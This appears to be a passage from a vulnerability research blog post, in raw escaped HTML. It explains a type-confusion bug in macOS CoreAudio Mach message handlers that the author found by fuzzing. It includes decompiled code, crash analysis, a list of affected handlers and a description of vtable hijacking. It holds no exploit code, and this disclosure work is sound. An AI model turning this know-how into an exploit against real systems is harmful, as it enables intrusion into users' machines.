 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;(HALS_ObjectMap&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;*)HALS_ObjectMap::CopyObjectByObjectID((HALS_ObjectMap&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;*)v3);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v7;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;!v7&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__cxa_allocate_exception(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0x10uLL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_QWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;amp;unk_7FF850E85518;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v13[&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;560947818&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__cxa_throw(v13,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;type_info&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&amp;amp;`typeinfo&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;CAException,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;CAException::~CAException);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.k7twkm2ata20&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c15 VEfNEQsFFH-c16&quot;&gt;An Intriguing Crash&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Whenever my fuzzer produced a crash, I always took the time to fully understand the crash&amp;rsquo;s root cause. Often, the crashes were not security relevant, (i.e. a &lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt; dereference) but fully understanding the reason behind the crash helped me understand the target better and invalid assumptions I was making with my fuzzing harness. Eventually, when I did identify security relevant crashes, I had a good understanding of the context surrounding them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The first indication from my fuzzer that a vulnerability might exist was a memory access violation during an indirect &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;call&lt;/span&gt;&lt;span&gt;&amp;nbsp;instruction, where the target address was calculated using an index into the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;rax&lt;/span&gt;&lt;span&gt;&amp;nbsp;register. As shown in the following backtrace, the crash occurred shallowly within the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_Fetch_Workgroup_Port&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;Mach message handler.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c28&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjubSBsnyG8QvIdmSd6oUoiSlrEsijU8dZWD5EAYS-F_Rw9rdOEkED63UTcmG5JlXQCudg3uJQRnjHmViOmDgdVJggTcPMS5Y3EKdDYKSQ6qofg6rONajgAuajmS-QnXDndTZoXLfogMp4ulUsHgq2VN1JWdI1YWZmB5oeQ7DuPlyELMcrncqMO3HuPESg/s1999/image8.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjubSBsnyG8QvIdmSd6oUoiSlrEsijU8dZWD5EAYS-F_Rw9rdOEkED63UTcmG5JlXQCudg3uJQRnjHmViOmDgdVJggTcPMS5Y3EKdDYKSQ6qofg6rONajgAuajmS-QnXDndTZoXLfogMp4ulUsHgq2VN1JWdI1YWZmB5oeQ7DuPlyELMcrncqMO3HuPESg/s1200/image8.png&quot; border=&quot;0&quot; alt=&quot;A debugger lldb output showing a crash in CoreAudio. The stop reason is EXC_BAD_ACCESS code=EXC_I386_GPFLT. The crashing instruction is a call qword ptr rax + 0x168 within CoreAudio_XIOContext_Fetch_Workgroup_Port. A backtrace bt shows the call stack leading to the crash.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A debugger lldb output showing a crash in CoreAudio. The stop reason is EXC_BAD_ACCESS code=EXC_I386_GPFLT. The crashing instruction is a call qword ptr rax + 0x168 within CoreAudio_XIOContext_Fetch_Workgroup_Port. A backtrace bt shows the call stack leading to the crash.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Further investigating the context of the crash in IDA, I noticed that the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;rax&lt;/span&gt;&lt;span&gt;&amp;nbsp;register triggering the invalid memory access was directly derived from a call to the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_ObjectMap::CopyObjectByObjectID&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;function.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKOjlZg7tN6UMrdy8DgCqIv2sFEBFgEZCxoOz16nMVhcjrVgmtvoqo0Ld54Gpd3KUYsY8Rru7Yk_FAWg_kpIxow4mY21i6Eq_D2v2AQ65rCO1Omv5dFrk9henKVLsDZvHKwo0S3twqyRfgRAEtL033wEbfDe_g-x9JoPdH3KdiF8cmtZM07vJiwIrR2Gs/s1308/image11.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKOjlZg7tN6UMrdy8DgCqIv2sFEBFgEZCxoOz16nMVhcjrVgmtvoqo0Ld54Gpd3KUYsY8Rru7Yk_FAWg_kpIxow4mY21i6Eq_D2v2AQ65rCO1Omv5dFrk9henKVLsDZvHKwo0S3twqyRfgRAEtL033wEbfDe_g-x9JoPdH3KdiF8cmtZM07vJiwIrR2Gs/s1200/image11.png&quot; border=&quot;0&quot; alt=&quot;A flowchart of disassembled code showing execution paths. One block includes calls to HALS_Client::EvaluateSandboxAllowsMicAccess and HALS_ObjectMap::CopyObjectByID. Subsequent blocks show calls to HALS_ObjectMap::ReleaseObject if certain conditions are met or branch to a different location loc_7FF813A5A928.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart of disassembled code showing execution paths. One block includes calls to HALS_Client::EvaluateSandboxAllowsMicAccess and HALS_ObjectMap::CopyObjectByID. Subsequent blocks show calls to HALS_ObjectMap::ReleaseObject if certain conditions are met or branch to a different location loc_7FF813A5A928.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Specifically, it attempted the following:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_ohg79bwzg1vr-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Fetch a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;from the Object Map based on an ID provided in the Mach message&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Dereference the address &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;a1&lt;/span&gt;&lt;span&gt;&amp;nbsp;at offset &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x68&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Dereference the address &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;a2&lt;/span&gt;&lt;span&gt;&amp;nbsp;at offset &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x0&lt;/span&gt;&lt;span&gt;&amp;nbsp;of &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;a1&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Call the function pointer at offset &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x168&lt;/span&gt;&lt;span&gt;&amp;nbsp;of &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1 VEfNEQsFFH-c15 VEfNEQsFFH-c31&quot;&gt;a2&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.q8bxcfn8v7u&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;What Went Wrong?&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The operations leading to the crash indicated that at offset &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x68&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;it fetched, the code expected a pointer to an object with a vtable. The code would then look up a function within the vtable, which would presumably retrieve the object&amp;rsquo;s &amp;ldquo;workgroup port.&amp;rdquo;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;When the fetched object was of type &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;ioct&lt;/span&gt;&lt;span&gt;, (IOContext) everything functioned as normal. However, the test input my fuzzer generated was causing the function to fetch a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span&gt;&amp;nbsp;of a different type, which led to an invalid function call. &lt;/span&gt;&lt;span&gt;The following diagram&lt;/span&gt;&lt;span&gt;&amp;nbsp;shows how an attacker able to influence the pointer at offset &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x68&lt;/span&gt;&lt;span&gt;&amp;nbsp;of a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;might hijack control flow.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgX8Qy5jCp4SjCfm24P9N5-MP6d3OUscsG6XH0o_uAKO7-8P9TrvGGqGbROmV1bqsf9O1A4uFbr5ST2PJKQDQKFBzWt5E8B8wR8AnqVYnQploFrNcGZ4A-iqQPi8pKkuJ_4rRDAogeXS6CCZG803obMHou4KAyn7fYklN5oKM7XE3JISsx7MbWGOihTnF4/s1999/image14.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgX8Qy5jCp4SjCfm24P9N5-MP6d3OUscsG6XH0o_uAKO7-8P9TrvGGqGbROmV1bqsf9O1A4uFbr5ST2PJKQDQKFBzWt5E8B8wR8AnqVYnQploFrNcGZ4A-iqQPi8pKkuJ_4rRDAogeXS6CCZG803obMHou4KAyn7fYklN5oKM7XE3JISsx7MbWGOihTnF4/s1200/image14.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrating a vtable exploit. It shows Expected ioct Object and Expected 2nd Object with their vtables pointing to legitimate functions. It contrasts this with an Actual Object where Attacker-Controlled Memory contains a void fake_vtable that redirects a getPort call, via a Malicious vtable containing void doEvil, ultimately leading to a CALL doEvil instead of the expected function.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram illustrating a vtable exploit. It shows Expected ioct Object and Expected 2nd Object with their vtables pointing to legitimate functions. It contrasts this with an Actual Object where Attacker-Controlled Memory contains a void fake_vtable that redirects a getPort call, via a Malicious vtable containing void doEvil, ultimately leading to a CALL doEvil instead of the expected function.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;This vulnerability class is referred to as a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c26&quot;&gt;type confusion&lt;/span&gt;&lt;span&gt;, where the vulnerable code makes the assumption that a retrieved object or struct is a specific type, but it is possible to provide a different one. The object&amp;rsquo;s memory layout might be completely different, meaning memory accesses and &lt;/span&gt;&lt;span&gt;vtable&lt;/span&gt;&lt;span&gt;&amp;nbsp;lookups might occur in the wrong place, or even out of bounds. Type confusion vulnerabilities can be extremely powerful due to their ability to form &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2015/06/what-is-good-memory-corruption.html&quot;&gt;reliable exploits&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9umxs616p0iv&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;Affected Functions&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_Fetch_Workgroup_Port&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach message handler wasn&amp;rsquo;t the only function that assumed it was dealing with an &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;ioct&lt;/span&gt;&lt;span&gt;&amp;nbsp;object without checking the type. The table below shows several other message handlers that suffered from the same issue:&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;VEfNEQsFFH-c25&quot; style=&quot;margin-top: 10pt; margin-bottom: 10pt&quot;&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c27 VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c19 VEfNEQsFFH-c15 VEfNEQsFFH-c32&quot;&gt;Mach Message Handler&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22 VEfNEQsFFH-c27&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c19 VEfNEQsFFH-c15 VEfNEQsFFH-c32&quot;&gt;Affected Routine&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1 VEfNEQsFFH-c15 VEfNEQsFFH-c31&quot;&gt;_XIOContext_Fetch_Workgroup_Port&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_Fetch_Workgroup_Port&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c33&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_Start&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;___ZNK14HALS_IOContext22HasEnabledInputStreamsEv_block_invoke&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_StartAtTime&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;___ZNK14HALS_IOContext16GetNumberStreamsEb_block_invoke&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_Start_With_WorkInterval&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;___ZNK14HALS_IOContext22HasEnabledInputStreamsEv_block_invoke&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_SetClientControlPort&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_SetClientControlPort&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;VEfNEQsFFH-c17&quot;&gt;&lt;td class=&quot;VEfNEQsFFH-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1 VEfNEQsFFH-c15 VEfNEQsFFH-c31&quot;&gt;_XIOContext_Stop&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;VEfNEQsFFH-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;VEfNEQsFFH-c24&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c1 VEfNEQsFFH-c15 VEfNEQsFFH-c31&quot;&gt;_XIOContext_Stop&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c28&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Apple did perform proper type checking on some of the Mach message handlers. For example, the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContent_PauseIO&lt;/span&gt;&lt;span&gt;&amp;nbsp;message handler, shown below, calls a function that checks whether the fetched object is of type &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;ioct&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;before using it. It is not clear why these checks were implemented in certain areas, but not others.&lt;/span&gt;&lt;/p&gt;
